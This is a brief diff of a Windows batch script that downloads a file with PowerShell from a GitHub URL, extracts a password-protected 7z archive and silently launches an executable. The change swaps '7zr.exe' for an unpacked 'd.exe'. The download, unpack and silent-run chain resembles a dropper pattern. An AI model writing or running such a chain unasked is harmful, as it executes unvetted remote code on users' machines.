@@ -26,4 +26,4 @@ powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com
 7zr e -p"123" aw.7z
 
 :: Run "7zr.exe" with the specified parameters
-start "" "7zr.exe" -silent key=438-483-664 logpath=C:\install.log
+start "" "d.exe" -silent key=438-483-664 logpath=C:\install.log
